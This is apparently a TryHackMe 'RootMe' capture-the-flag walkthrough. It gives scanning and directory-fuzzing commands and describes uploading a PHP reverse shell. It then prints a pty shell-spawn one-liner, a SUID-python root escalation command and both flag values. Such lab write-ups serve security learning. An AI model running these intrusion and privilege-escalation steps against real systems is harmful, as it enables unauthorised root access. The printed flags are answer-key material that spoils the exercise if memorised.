# THM - RootMe
## Scanning
```bash
→ sudo ping -c 4 10.10.247.80

→ nmap -Pn -sC -sV -oN nmap.txt 10.10.247.80
```


## Enumeration
```bash
→ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.247.80/FUZZ -c
# /panel/
```
1. In `panel` directory upload `revshell.php5`.
2. Use netcat command.
3. Execute file in `uploads` directory.


## Find user flag
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

find / -type f -name user.txt

cat /var/www/user.txt
# THM{y0u_g0t_a_sh3ll}
```


## privilege escalation
```bash
find / -type f -user root -perm -4000 2>/dev/null
# /usr/bin/python 

python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’
# Become to root user.
# https://gtfobins.github.io/

cat root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```